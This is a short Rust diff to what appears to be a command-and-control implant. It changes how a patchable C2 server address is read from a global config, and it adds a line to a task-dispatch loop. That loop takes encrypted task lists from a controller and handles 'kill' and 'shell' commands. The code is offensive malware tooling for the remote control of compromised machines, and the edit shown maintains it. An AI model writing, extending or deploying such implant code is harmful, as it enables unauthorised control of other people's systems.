@@ -41,9 +41,11 @@ impl C2Config {
     pub fn get_global() -> Self {
         unsafe {
             // Check if patched
-            let addr_len = GLOBAL_CONFIG.server_addr.iter().position(|&c| c == 0).unwrap_or(64);
+            let addr_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.server_addr);
+            let addr_slice = &*addr_ptr;
+            let addr_len = addr_slice.iter().position(|&c| c == 0).unwrap_or(64);
             let addr_str = if addr_len > 0 {
-                core::str::from_utf8_unchecked(&GLOBAL_CONFIG.server_addr[..addr_len])
+                core::str::from_utf8_unchecked(&addr_slice[..addr_len])
             } else {
                 "127.0.0.1"
             };
@@ -290,6 +292,9 @@ fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &m
 
     if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
         for task in response.tasks {
+            // Acknowledge task receipt (conceptually, or via log if we had one)
+            let _task_id = &task.id; 
+
             match task.task_type.as_str() {
                 "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                 "shell" => {
